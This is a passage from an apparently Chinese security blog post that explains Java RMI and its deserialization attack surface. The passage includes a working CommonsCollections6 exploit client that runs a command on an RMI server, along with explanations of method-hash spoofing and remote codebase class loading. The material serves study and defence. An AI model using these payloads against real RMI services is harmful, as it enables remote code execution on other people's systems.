class="hljs-keyword">public</span> String <span class="hljs-title function_">sayGoodbye</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><p>接口实现类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteObject</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RemoteInterface</span> &#123;<br><span class="hljs-keyword">protected</span> <span class="hljs-title function_">RemoteObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>&#125;<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello My Friend&quot;</span>;<br>&#125;<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br><span class="hljs-keyword">return</span> name.getClass().getName();<br>&#125;<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayGoodbye</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Bye&quot;</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们通常使用 <code>LocateRegistry#createRegistry()</code> 方法来创建注册中心：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Registry</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span> &#123;<br><span class="hljs-keyword">try</span> &#123;<br>LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>System.out.println(<span class="hljs-string">&quot;Server Start&quot;</span>);<br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>e.printStackTrace();<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后将待调用的类进行绑定：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteServer</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, MalformedURLException, AlreadyBoundException, InterruptedException &#123;<br><span class="hljs-comment">// 创建远程对象</span><br><span class="hljs-type">RemoteInterface</span> <span class="hljs-variable">remoteObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObject</span>();<br><span class="hljs-comment">// 绑定</span><br>Naming.bind(<span class="hljs-string">&quot;rmi://localhost:1099/Hello&quot;</span>, remoteObject);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>也可以直接整合到Server处注册远程对象，使用<code>LocateRegistry#createRegistry()</code>来创建注册中心，<code>Registry#bind()</code>进行绑定：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">RemoteInterface</span> <span class="hljs-variable">remoteObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObject</span>();<br>        Naming.bind(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, remoteObject);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Naming 提供了查询（lookup）、绑定（bind）、重新绑定（rebind）、接触绑定（unbind）、list（列表）用来对注册表进行操作。也就是说，Naming 是一个用来对注册表进行操作的类。而这些方法的具体实现，其实是调用 <code>LocateRegistry.getRegistry</code> 方法获取了 Registry 接口的实现类，并调用其相关方法进行实现的。</p><p>这些方法的第一个参数都接收一个URL字符串，<code>rmi://host:port/name</code>，表示注册中心所在主机和端口，远程对象引用的名称。</p><p>一般注册中心和服务端都在同一主机。</p><p><strong>Client</strong></p><p>客户端也需要定义和服务端相同的远程接口，然后进行调用：</p><p><code>LocateRegistry#getRegistry()</code>连接注册中心，<code>Registry#lookup()</code>获取远程对象的存根，通过名称查找。注册中心默认端口1099</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NotBoundException &#123;<br><span class="hljs-comment">// sun.rmi.registry.RegistryImpl_Stub</span><br><span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1099</span>);<br>System.out.println(Arrays.toString(registry.list()));<br><span class="hljs-comment">// lookup and call</span><br><span class="hljs-type">RemoteInterface</span> <span class="hljs-variable">stub</span> <span class="hljs-operator">=</span> (RemoteInterface) registry.lookup(<span class="hljs-string">&quot;Hello&quot;</span>);<br>System.out.println(stub.sayHello());<br>System.out.println(stub.sayGoodbye());<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里 RemoteInterface 接口在 Client&#x2F;Server&#x2F;Registry 均应该存在，只不过通常 Registry 与 Server 通常在同一端上。</p><p>RMI支持动态类加载来进行反序列化。上面的远程方法调用涉及方法参数的传递，若客户端传递了一个服务端不存在的类对象，服务端如何进行反序列化呢？</p><p>最后还有个小trick，首先是动态类加载，如果客户端在调用时，传递了一个可序列化对象，这个对象在服务端不存在，则在服务端会抛出 ClassNotFound 的异常，但是 RMI 支持动态类加载，若设置了<code>java.rmi.server.codebase</code>，则服务端会尝试从其地址获取 <code>.class</code> 并加载及反序列化。加载字节码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">System.setProperty(<span class="hljs-string">&quot;java.rmi.server.codebase&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1:9999/&quot;</span>);<br></code></pre></td></tr></table></figure><p><strong>所以，打反序列化的时候，恶意Server端可以如此存放恶意class字节码，让Client来调用从而RCE。</strong></p><p>可使用 <code>System.setProperty(&quot;java.rmi.server.codebase&quot;, &quot;http://127.0.0.1:9999/&quot;);</code> 进行设置，或使用启动参数 <code>-Djava.rmi.server.codebase=&quot;http://127.0.0.1:9999/&quot;</code> 进行指定。</p><p>接下来就是安全策略的设置，因为我们通过网络加载外部类并执行方法，所以我们必须要有一个安全管理器来进行管理，如果没有设置安全管理，则 RMI 不会动态加载任何类，通常我们使用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (System.getSecurityManager() == <span class="hljs-literal">null</span>) &#123;<br>    System.setSecurityManager(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RMISecurityManager</span>());<br>&#125;<br></code></pre></td></tr></table></figure><p>管理器应与管理策略相辅相成，所以我们还需要提供一个策略文件，里面配置允许那些主机进行哪些操作，这里为了方便测试，直接设置全部权限：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">grant &#123;<br>    permission java.security.AllPermission;<br>&#125;;<br></code></pre></td></tr></table></figure><p>同样可以使用 <code>-Djava.security.policy=rmi.policy</code> 或 <code>System.setProperty(&quot;java.security.policy&quot;, RemoteServer.class.getClassLoader().getResource(&quot;rmi.policy&quot;).toString());</code> 来进行设置。</p><h2 id="RMI底层原理总结"><a href="#RMI底层原理总结" class="headerlink" title="RMI底层原理总结"></a>RMI底层原理总结</h2><p>对于更底层部分的分析我就不献丑，网上很多大牛都写得很透彻清晰，这里我就只写写RMI-Attack行为了。</p><p>底层原理可以总结为（借用su18佬的图图）：</p><p><img src="/2024/07/18/RMI-JNDI/3.png" alt="3"></p><p>总而言之，RMI 底层通讯采用了Stub (运行在客户端) 和 Skeleton (运行在服务端) 机制，RMI 调用远程方法的大致如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1</span>、RMI 客户端在调用远程方法时会先创建 Stub ( sun.rmi.registry.RegistryImpl_Stub )。<br><span class="hljs-number">2</span>、Stub 会将 Remote 对象传递给远程引用层 ( java.rmi.server.RemoteRef ) 并创建 java.rmi.server.RemoteCall( 远程调用 )对象。<br><span class="hljs-number">3</span>、RemoteCall 序列化 RMI 服务名称、Remote 对象。<br><span class="hljs-number">4</span>、RMI 客户端的远程引用层传输 RemoteCall 序列化后的请求信息通过 Socket 连接的方式传输到 RMI 服务端的远程引用层。<br><span class="hljs-number">5</span>、RMI服务端的远程引用层( sun.rmi.server.UnicastServerRef )收到请求会请求传递给 Skeleton ( sun.rmi.registry.RegistryImpl_Skel#dispatch )。<br><span class="hljs-number">6</span>、Skeleton 调用 RemoteCall 反序列化 RMI 客户端传过来的序列化。<br><span class="hljs-number">7</span>、Skeleton 处理客户端请求：bind、list、lookup、rebind、unbind，如果是 lookup 则查找 RMI 服务名绑定的接口对象，序列化该对象并通过 RemoteCall 传输到客户端。<br><span class="hljs-number">9</span>、RMI 客户端反序列化服务端结果，获取远程对象的引用。<br><span class="hljs-number">10</span>、RMI 客户端调用远程方法，RMI服务端反射调用RMI服务实现类的对应方法并序列化执行结果返回给客户端。<br><span class="hljs-number">11</span>、RMI 客户端反序列化 RMI 远程方法调用结果。<br></code></pre></td></tr></table></figure><h2 id="RMI-Attack"><a href="#RMI-Attack" class="headerlink" title="RMI-Attack"></a>RMI-Attack</h2><p>这里我觉得su18佬的电话本比喻很恰当也很易懂，Java RMI 设计了一个 Registry 的思想，很好理解，我们可以使用注册表来查找一个远端对象的引用，更通俗的来讲，这个就是一个 RMI 电话本。</p><p>我们想在某个人那里获取信息时（Remote Method Invocation），我们在电话本上（Registry）通过这个人的名称 （Name）来找到这个人的电话号码（Reference），并通过这个号码找到这个人（Remote Object）。</p><p>参与一次 RMI 调用的有三个角色，分别是 Server 端，Registry 端和 Client 端。严格意义上来讲，只有 Registry 端和使用 Registry 的端，因为 Registry 端只负责查询和传递引用，真正的方法调用是不需要经过 Registry 端的，只不过注册服务的我们称之为 Server 端，使用服务的我们称之为 Client 端。</p><p><strong>有一种我只负责帮你找到人，至于你找这个人做什么非法勾当我不管的感觉</strong>，不过为了更清晰的划分不同角色，我们还是将其分为三个角色，而通常情况下，Server 端和 Registry 端是同一端。</p><p>RMI调用过程决定了三者都涉及反序列化操作，所以对这三者的攻击就呼之欲出。</p><p>大概分这几种：</p><ol><li>攻击客户端<ul><li>RegistryImp_Stub#lookup 反序列化注册中心返回的Stub</li><li>UnicastRef#invoke 反序列化远调方法的执行结果</li><li>StreamRemoteCall#executeCall 反序列化远程调用返回的异常类</li><li>DGCImpl_Stub#dirty</li></ul></li><li>攻击服务端<ul><li>UnicastServerRef#dispatch 反序列化客户端传递的方法参数</li><li>DGCImpl_Skel#dispatch</li></ul></li><li>攻击注册中心<ul><li>RegistryImp_Stub#bind 注册中心反序列化服务端传递传来的远程对象</li></ul></li></ol><h3 id="Server-端-Attack"><a href="#Server-端-Attack" class="headerlink" title="Server 端 Attack"></a>Server 端 Attack</h3><h4 id="恶意服务参数"><a href="#恶意服务参数" class="headerlink" title="恶意服务参数"></a>恶意服务参数</h4><p>这里需要一个背景，当 Client 端获取到 Server 端创建的 Stub 后，Client 会在本地调用这个 Stub 并传递参数，Stub 会序列化这个参数并传递给 Server 端，<strong>Server 端就会反序列化 Client 端传入的参数并进行调用</strong>，如果这个参数是 <strong>Object 类型</strong>的情况下，Client 端可以传给 Server 端<strong>任意的类</strong>，直接造成反序列化漏洞。</p><p>例如我们上面写的在远程调用接口 RemoteInterface 存在一个传入Object类型的<code>sayGoodbye</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Hello</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><p>那就直接可以传一个反序列化 payload 进去执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">9999</span>);<br>        <span class="hljs-type">Hello</span> <span class="hljs-variable">stub</span> <span class="hljs-operator">=</span> (Hello) r.lookup(<span class="hljs-string">&quot;hello&quot;</span>);<br>        stub.sayHello(getPayload());<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getPayload</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, transformerChain);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;xxx&quot;</span>);<br><br>        lazyMap.remove(<span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(transformerChain, transformers);<br><br>        <span class="hljs-keyword">return</span> expMap;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Hello</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>        String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>CC6直接弹calc。</p><p>如果参数类型不是 Object 类型，那能否进行攻击？</p><p>当然可以。</p><p>这里可以看一个小实验，我们在Server的接口处若使用<code>HelloObject</code>作为函数参数，Client的接口使用<code>Object</code>作为函数参数：</p><p>Server：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RemoteInterface</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(HelloObject name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><p>Client:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RemoteInterface</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样若想直接触发反序列化洞会报错：</p><p><img src="/2024/07/18/RMI-JNDI/4.png" alt="4"></p><p>其实可以看出，就是在服务端没有找到对应的调用方法。可以发现这个调用方法在 UnicastServerRef 的 <code>dispatch</code> 方法中在 <code>this.hashToMethod_Map</code> 中通过 Method 的 hash 来查找。</p><p>这个 hash 实际上是一个基于方法签名的 SHA1 hash 值。</p><p>那有没有一种可能，<strong>我们传递的是 Server 端能找到的参数是 HelloObject 的 Method 的 hash，但是传递的参数却不是 HelloObject 而是恶意的反序列化数据（可能是 Object或其他的类）呢？</strong></p><p>答案是可以的，在 mogwailabs 的 [PPT](<a href="https://github.com/mogwailabs/rmi-deserialization/blob/master/BSides">https://github.com/mogwailabs/rmi-deserialization/blob/master/BSides</a> Exploiting RMI Services.pdf) 中提出了以下 4 种方法：</p><ul><li>通过网络代理，在流量层修改数据</li><li>自定义 “java.rmi” 包的代码，自行实现</li><li>字节码修改</li><li>使用 debugger</li></ul><p>并且在 PPT 中还给出了 hook 点，那就是动态代理中使用的 RemoteObjectInvocationHandler 的 <code>invokeRemoteMethod</code> 方法。</p><p>客户端的接口也添加一个同服务端相同的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Hello</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object s)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>    String <span class="hljs-title function_">sayGoodBye</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>    String <span class="hljs-title function_">sayGoodBye</span><span class="hljs-params">(HelloObject o)</span> <span class="hljs-keyword">throws</span> RemoteException;  <span class="hljs-comment">//Same as Server&#x27;s</span><br>&#125;<br></code></pre></td></tr></table></figure><p>即调试下断点的时候，在<code>RemoteObjectInvocationHandler</code>调用<code>invokeRemoteMethod</code>的时候修改method（在 RemoteObjectInvocationHandler 的 <code>invokeRemoteMethod</code> 方法处下断，将 Method 改为服务端存在的 HelloObject 的 Method），下面<code>getMethodHash(method)</code>获取到的哈希就和服务端的一样了，后续弹calc都一样的。</p><p><img src="/2024/07/18/RMI-JNDI/5.png" alt="5"></p><p>Afant1 师傅使用了 Java Agent 的方式插桩，在<a href="https://www.anquanke.com/post/id/200860">这篇文章</a>里，0c0c0f 师傅使用了流量层的替换，在<a href="https://mp.weixin.qq.com/s/TbaRFaAQlT25ASmdTK_UOg">这篇文章</a>里，有兴趣的师傅请自行查看。</p><p>利用这种方式，就大大的扩展了利用链。RMI 的反序列化逻辑位于 <code>sun.rmi.server.UnicastRef#unmarshalValue</code>，如下：</p><p><img src="/2024/07/18/RMI-JNDI/6.png" alt="6"></p><p>可以看到，除了基础数据类型，其他的类型均能调用 readObject 进行反序列化，甚至原本 String 类型的参数也会走 readObject 反序列化，那么结合之前的替换手段，总结起来就是：</p><blockquote><p><strong>Server 端的调用方法存在非基础类型的参数时，就可以被恶意 Client 端传入恶意数据流触发反序列化漏洞。</strong></p></blockquote><h4 id="动态类加载"><a href="#动态类加载" class="headerlink" title="动态类加载"></a>动态类加载</h4><p>上面说过，RMI反序列化参数的时候，若在本地找不到类，会在指定的codebase下加载类，而codebase可以由客户端指定，那么这就是一个很有用的打反序列化的地方。这个特性在 6u45&#x2F;7u21 之前都是默认开启的。</p><p>为了能够远程加载目标类，需要 Server 加载并配置 SecurityManager，并设置 <code>java.rmi.server.useCodebaseOnly=false</code>。</p><p>Server 端调用 UnicastServerRef 的 <code>dispatch</code> 方法处理客户端请求，调用 <code>unmarshalParameters</code> 方法反序列化客户端传来的参数。</p><p>反序列化过程由 RMI 封装类 MarshalInputStream 来实现，会调用 <code>resolveClass</code> 来解析 Class。</p><p>无论 Server 端还是 Client 端，只要有一端配置了 <code>java.rmi.server.codebase</code>，这个属性都会跟随数据流在两端流动。</p><p><strong>因此，Client 端可以通过配置此项属性，并向 Server 端传递不存在的类，使 Server 端试图从 <code>java.rmi.server.codebase</code> 地址中远程加载恶意类而触发攻击。</strong></p><h4 id="替身攻击"><a href="#替身攻击" class="headerlink" title="替身攻击"></a>替身攻击</h4><p>在讨论对 Server 端的攻击时，还出现了另外一种针对参数的攻击思路，su18师傅称其为替身攻击。依旧是用来绕过当参数不是 Object，是指定类型，但是还想触发反序列化的一种讨论。</p><p>大体的思路就是调用的方法参数是 <code>HelloObject</code>，而攻击者希望使用 CC 链来反序列化，比如使用了一个入口点为 HashMap 的 POC，那么攻击者在本地的环境中将 HashMap 重写，让 HashMap 继承 HelloObject，然后实现反序列化漏洞攻击的逻辑，用来欺骗 RMI 的校验机制。</p><p>这的确是一种思路，但是还不如 hook RMI 代码修改逻辑来得快，所以这里不进行测试。</p><h3 id="Registry-端-Attack"><a href="#Registry-端-Attack" class="headerlink" title="Registry 端 Attack"></a>Registry 端 Attack</h3><p>在使用 Registry 时，首先由 Server 端向 Registry 端绑定服务对象，这个对象是一个 Server 端生成的动态代理类，Registry 端会反序列化这个类并存在自己的 RegistryImpl 的 bindings 中，以供后续的查询。</p><p>所以如果我们是一个恶意的 Server 端，向 Registry 端输送了一个恶意的对象，在其反序列化时就可以触发恶意调用。</p><p>这里仍然用 CC6 测试，而因为 bind 的参数是需要是 Remote 类型的，所以这里使用了 AnnotationInvocationHandler 来代理了 Remote 接口，形成了反序列化漏洞。</p><p>形如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 